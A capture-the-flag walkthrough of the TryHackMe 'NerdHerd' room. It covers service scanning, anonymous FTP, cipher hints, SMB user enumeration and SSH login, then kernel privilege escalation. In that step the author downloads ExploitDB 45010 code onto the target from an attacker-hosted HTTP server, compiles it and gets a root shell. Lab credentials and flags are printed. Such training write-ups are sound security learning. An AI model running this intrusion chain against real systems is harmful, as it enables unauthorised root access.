May 9, 2025<br>
Day 368<br>

<h1>NerdHerd</h1>

https://tryhackme.com/room/nerdherd<br>

![image](https://github.com/user-attachments/assets/7fa43ea1-b728-4cc7-b018-31e429c30629)

<br>




![image](https://github.com/user-attachments/assets/2f093892-fa55-4536-95ae-34a83a5271f1)




<br>
<br>

<h2 align="center">$$\textcolor{white}{\textnormal{Nmap}}$$</h2>

<p align="center">There are have 4 ports open: <code>21/ftp</code>, <code>22/ssh</code>, <code>139/smbd</code> and <code>445/smdb</code>. </p>

```bash
~# nmap -sC -sV -sS -A -O TargetIP
...
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:AttackIP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
...

Host script results:
|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: 0s
|_nbstat: NetBIOS name: NERDHERD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: nerdherd
|   NetBIOS computer name: NERDHERD\x00
|   Domain name: \x00
|   FQDN: nerdherd
|_  System time: 2025-05-10T02:54:26+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-05-09T23:54:26
|_  start_date: N/A

```

<h2 align="center">$$\textcolor{white}{\textnormal{ftp}}$$</h2>

```bash
ftp TargetIP
...
Name (TargetIP:root): Anonymous
230 Login successful.
...
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .jokesonyou
-rw-rw-r--    1 ftp      ftp         89894 Sep 11  2020 youfoundme.png
226 Directory send OK.
ftp> get youfoundme.png
local: youfoundme.png remote: youfoundme.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for youfoundme.png (89894 bytes).
226 Transfer complete.
89894 bytes received in 0.00 secs (49.5547 MB/s)
ftp> cd .jokesonyou
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
-rw-r--r--    1 ftp      ftp            28 Sep 14  2020 hellon3rd.txt
226 Directory send OK.
ftp> get hellon3rd.txt
local: hellon3rd.txt remote: hellon3rd.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for hellon3rd.txt (28 bytes).
226 Transfer complete.
28 bytes received in 0.00 secs (60.8992 kB/s)
ftp> exit
221 Goodbye.
:~# 
```

<br>

<h2 align="center">$$\textcolor{white}{\textnormal{youfoundme.png}}$$</h2>

<p>Discovered <code>Owner Name</code> : <code>fijbxslz</code>.<br><br>
Googled <code>fijbxslz</code> and discovered it is about <code>Vigenére cipher</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/96a8df77-97c4-47bf-bbbb-3efcdb949bdb)

<br>


```bash
exiftool youfoundme.png
ExifTool Version Number         : 11.88
File Name                       : youfoundme.png
Directory                       : .
File Size                       : 88 kB
File Modification Date/Time     : 2025:05:10 00:59:40+01:00
File Access Date/Time           : 2025:05:10 00:59:40+01:00
File Inode Change Date/Time     : 2025:05:10 00:59:40+01:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 894
Image Height                    : 894
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 3543
Pixels Per Unit Y               : 3543
Pixel Units                     : meters
Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)
Datecreate                      : 2010-10-26T08:00:31-07:00
Datemodify                      : 2010-10-26T08:00:31-07:00
Software                        : www.inkscape.org
EXIF Orientation                : 1
Exif Byte Order                 : Big-endian (Motorola, MM)
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
Flashpix Version                : 0100
Owner Name                      : fijbxslz
Image Size                      : 894x894
Megapixels                      : 0.799
```


<h2 align="center">$$\textcolor{white}{\textnormal{hellon3rd.txt}}$$</h2>

```bash
~# cat hellon3rd.txt
all you need is in the leet
```

<h2 align="center">$$\textcolor{white}{\textnormal{1337}}$$</h2>


![image](https://github.com/user-attachments/assets/7cb0cb54-c55a-4942-8ace-351e3e900b01)

<br>


<h2 align="center">$$\textcolor{white}{\textnormal{http://TargetIP:1337}}$$</h2>

```bash
~# curl http://TargetIP:1337
<!DOCTYPE html>
<html>
<body>
...

<!--
	hmm, wonder what i hide here?
 -->
...
<!--
	maybe nothing? :)
 -->
...
<!--
	keep digging, mister/ma'am
 -->
...
<body onload="alertFunc()">

<script>
function alertFunc() {
  alert("HACKED by 0xpr0N3rd");
  alert("Just kidding silly.. I left something in here for you to find")
}
</script>

<p>Maybe the answer is in <a href="https://www.youtube.com/watch?v=9Gc4QTqslN4">here</a>.</p>

</body>
</html>
```


<h2 align="center">$$\textcolor{white}{\textnormal{Youtube}}$$</h2>

![image](https://github.com/user-attachments/assets/1fe91c07-98a9-4bbd-b65b-1428d04467f3)


<br>

<p>Discovered <code>birdistheword</code> hint.</p>

<br>

<h2 align="center">$$\textcolor{white}{\textnormal{CyberChef}}$$</h2>

<p>Discovered <code>easypass</code></p>

![image](https://github.com/user-attachments/assets/c217e8d1-62ce-4699-9725-cbb58b008800)

<br>

<h2 align="center">$$\textcolor{white}{\textnormal{smbclient}}$$</h2>

```bash
:~# smbclient -L \\10.10.175.42
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	nerdherd_classified Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (nerdherd server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available


```


<h2 align="center">$$\textcolor{white}{\textnormal{enum4linux}}$$</h2>

<br>

```bash
~# enum4linux TargetIP
...
 ========================== 
|    Target Information    |
 ========================== 
Target ........... TargetIP
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on TargetIP    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for TargetIP    |
 ============================================ 
Looking up status of TargetIP
	NERDHERD        <00> -         B <ACTIVE>  Workstation Service
	NERDHERD        <03> -         B <ACTIVE>  Messenger Service
	NERDHERD        <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on TargetIP    |
 ===================================== 
[+] Server 10.10.175.42 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for TargetIP    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

...

 ============================= 
|    Users on TargetIP    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck	Name: ChuckBartowski	Desc: 

user:[chuck] rid:[0x3e8]

 ========================================= 
|    Share Enumeration on TargetIP    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	nerdherd_classified Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (nerdherd server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on TargetIP
...

 ==================================================== 
|    Password Policy Information for TargetIP2    |
 ==================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 ============================== 
|    Groups on TargetIP    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on TargetIP via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2306820301-2176855359-2727674639
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
...
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\chuck (Local User)
S-1-22-1-1002 Unix User\ftpuser (Local User)
[+] Enumerating users using SID S-1-5-21-2306820301-2176855359-2727674639 and logon username '', password ''
S-1-5-21-2306820301-2176855359-2727674639-500 *unknown*\*unknown* (8)
...
S-1-5-21-2306820301-2176855359-2727674639-513 NERDHERD\None (Domain Group)
...
S-1-5-21-2306820301-2176855359-2727674639-1000 NERDHERD\chuck (Local User)
...

```



<p>Discovered <code>chuck</code> : <code>ChuckBartowski</code>:<code>easypass</code>.</p>

```bash
:~# smbclient //TargetIP/nerdherd_classified --user=chuck
Password for [WORKGROUP\chuck]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 11 02:29:53 2020
  ..                                  D        0  Thu Nov  5 20:44:40 2020
  secr3t.txt                          N      125  Fri Sep 11 02:29:53 2020

		8124856 blocks of size 1024. 3414268 blocks available
smb: \> get secr3t.txt
getting file \secr3t.txt of size 125 as secr3t.txt (5.8 KiloBytes/sec) (average 5.8 KiloBytes/sec)
smb: \> exit
```

<br>


<p>Discovered <code>/this1sn0tadirect0ry</code> and <code>0xpr0N3rd</code>.</p>

```bash
:~# cat secr3t.txt
Ssssh! don't tell this anyone because you deserved it this far:

	check out "/this1sn0tadirect0ry"

Sincerely,
	0xpr0N3rd
<3
```

<h2 align="center">$$\textcolor{white}{\textnormal{/this1sn0tadirect0ry}}$$</h2>

![image](https://github.com/user-attachments/assets/c3060249-bf25-4c6a-b16b-773a37fb4cac)

<br>

![image](https://github.com/user-attachments/assets/f19d2f7b-7e75-415e-abb0-d61b571194a9)

<br>

<p>Discovered <code>ssh</code>code> creds --> <code>chuck</code>:<code>th1s41ntmypa5s</code></p>

```bash
:~# cat secr3t.txt
Ssssh! don't tell this anyone because you deserved it this far:

	check out "/this1sn0tadirect0ry"

Sincerely,
	0xpr0N3rd
<3
```


<h2 align="center">$$\textcolor{white}{\textnormal{ssh}}$$</h2>

```bash
:~# ssh chuck@TargetIP
...
chuck@nerdherd:~$ id
uid=1000(chuck) gid=1000(chuck) groups=1000(chuck),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
chuck@nerdherd:~$ pwd
/home/chuck
chuck@nerdherd:~$ ls
Desktop    Downloads         Music                Pictures  Templates  Videos
Documents  examples.desktop  nerdherd_classified  Public    user.txt
chuck@nerdherd:~$ ls -la
total 192
drwxr-xr-x 19 chuck chuck  4096 May 10 04:05 .
drwxr-xr-x  4 root  root   4096 Eyl 11  2020 ..
-rwxrwxr-x  1 chuck chuck 13728 May 10 03:59 45010.c
-rw-------  1 chuck chuck   742 Kas  5  2020 .bash_history
-rw-r--r--  1 chuck chuck   220 Eyl 11  2020 .bash_logout
-rw-r--r--  1 chuck chuck  3771 Eyl 11  2020 .bashrc
drwx------ 14 chuck chuck  4096 Eyl 14  2020 .cache
drwx------  3 chuck chuck  4096 Eyl 11  2020 .compiz
drwx------ 15 chuck chuck  4096 Kas  5  2020 .config
drwxr-xr-x  2 chuck chuck  4096 Kas  5  2020 Desktop
-rw-r--r--  1 chuck chuck    25 Eyl 11  2020 .dmrc
drwxr-xr-x  2 chuck chuck  4096 Eyl 11  2020 Documents
drwxr-xr-x  3 chuck chuck  4096 Eyl 11  2020 Downloads
-rw-r--r--  1 chuck chuck  8980 Eyl 11  2020 examples.desktop
-rwxrwxr-x  1 chuck chuck 18432 May 10 04:05 exploit
-rwxrwxr-x  1 chuck chuck 18432 May 10 04:03 expoit
drwx------  2 chuck chuck  4096 Eki 19  2020 .gconf
drwx------  3 chuck chuck  4096 Kas  5  2020 .gnupg
-rw-------  1 chuck chuck  4564 Kas  5  2020 .ICEauthority
drwx------  3 chuck chuck  4096 Eyl 11  2020 .local
drwx------  4 chuck chuck  4096 Eyl 11  2020 .mozilla
drwxr-xr-x  2 chuck chuck  4096 Eyl 11  2020 Music
drwxrwxr-x  2 chuck chuck  4096 Eyl 11  2020 .nano
drwxr-xr-x  2 root  root   4096 Eyl 11  2020 nerdherd_classified
drwxr-xr-x  2 chuck chuck  4096 Eyl 11  2020 Pictures
-rw-r--r--  1 chuck chuck   655 Eyl 11  2020 .profile
drwxr-xr-x  2 chuck chuck  4096 Eyl 11  2020 Public
-rw-r--r--  1 chuck chuck     0 Eyl 11  2020 .sudo_as_admin_successful
drwxr-xr-x  2 chuck chuck  4096 Eyl 11  2020 Templates
-rw-rw-r--  1 chuck chuck    46 Eyl 14  2020 user.txt
drwxr-xr-x  2 chuck chuck  4096 Eyl 11  2020 Videos
-rw-------  1 root  root    511 Eyl 11  2020 .viminfo
-rw-------  1 chuck chuck    53 Kas  5  2020 .Xauthority
-rw-------  1 chuck chuck    82 Kas  5  2020 .xsession-errors
-rw-------  1 chuck chuck    82 Kas  5  2020 .xsession-errors.old
chuck@nerdherd:~$ strings .bash_history
exit
exit
exit
ifconfig 
clear
ftp localhost
clear
cd /Desk
cd /home/chuck/Desktop/
clear
ftp localhost
service restart ftp
service ftpd restart
why are you looking at my logs????
clear
ftp localhost
restart
reboot
chuck@nerdherd:~$ cat user.txt
THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}
chuck@nerdherd:~$ 
```

<br>


<h2 align="center">$$\textcolor{white}{\textnormal{uname}}$$</h2>

```bash
chuck@nerdherd:~$ uname -r
4.4.0-31-generic
```


<br>


<h2 align="center">$$\textcolor{white}{\textnormal{ExploitDB}}$$</h2>

<p>CVE-2017-16995</p>

<br>

```bash
http://www.exploit-db.com/exploits/45010
```


<h2 align="center">$$\textcolor{white}{\textnormal{45010.c}}$$</h2>

![image](https://github.com/user-attachments/assets/76983152-8e94-4be7-933c-a0da558f5b96)


<h2 align="center">$$\textcolor{white}{\textnormal{Server}}$$</h2>

```bash
~# python3 -m http.server 333
```

<h2 align="center">$$\textcolor{white}{\textnormal{Donwloaded 45010.c to the Target}}$$</h2>

```bash
:~$ wget http://10.10.134.89:3333/45010.c
...
45010.c                      100%[============================================>]  13,41K  --.-KB/s    in 0s 

```


<h2 align="center">$$\textcolor{white}{\textnormal{Server}}$$</h2>

```bash
:~# python3 -m http.server 3333
Serving HTTP on 0.0.0.0 port 3333 (http://0.0.0.0:3333/) ...
TargetIP - - [10/May/2025 02:01:36] "GET /45010.c HTTP/1.1" 200 -
```

<h2 align="center">$$\textcolor{white}{\textnormal{gcc}}$$</h2>

```bash
chuck@nerdherd:~$ gcc -o exploit 45010.c
chuck@nerdherd:~$ chmod +x exploit
chuck@nerdherd:~$ ./exploit
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff880039526f00
[*] Leaking sock struct from ffff88003ae5e180
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88003b6e9c00
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88003b6e9c00
[*] credentials patched, launching shell...
# whoami
root
# pwd
/home/chuck
# cd /root
# ls
root.txt
# cat root.txt
cmon, wouldnt it be too easy if i place the root flag here?


# locate root.txt
/opt/.root.txt
/root/root.txt
# cat /opt/.root.txt
nOOt nOOt! you've found the real flag, congratz!

THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}
# 
```

<br>

<h2 align="center">$$\textcolor{white}{\textnormal{.bash_history}}$$</h2>

```bash
# cat .bash_history
...
rm creds.html 
nano creds.txt 
cd ..
cd pu
cd ftp/
cd pub/
ls -la
cp youfoundme.png /home/chuck/Desktop/
ls -la
rm youfoundme.png 
THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}
mv /home/chuck/Downloads/youfoundme.png .
rm youfoundme.png 
mv /home/chuck/Downloads/youfoundme.png .
clear
...
```

<br>
<br>

<h1>Room Completed</h1>

![image](https://github.com/user-attachments/assets/cabfb6d5-d54d-49b9-9c9b-ad044f72014b)

<br>

![image](https://github.com/user-attachments/assets/6d90054e-d65b-4f36-b189-10680f9f83c5)

<br>
<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |Global        | Brazil       | Global      | Brazil     |          | Completed |           |
| May 9, 2025       | 368      |     231ˢᵗ    |        5ᵗʰ   |   419ᵗʰ     |     8ᵗʰ    |100,723   |       721 |   62      |

</div>


![image](https://github.com/user-attachments/assets/f5c00ea6-15df-4a4b-aa30-2390c63cd422)

<br>

![image](https://github.com/user-attachments/assets/9018e14b-bdb5-4737-b6a3-43b0e5d222b5)

<br>

![image](https://github.com/user-attachments/assets/73d78a0e-69af-42e0-88bd-715e41d92501)

<br>

![image](https://github.com/user-attachments/assets/ade772a3-9ca3-4a9c-b1cc-341b6b273564)


<br>
<br>


![image](https://github.com/user-attachments/assets/f1df0a66-28f2-4b8a-8885-5fe79bf9ca03)




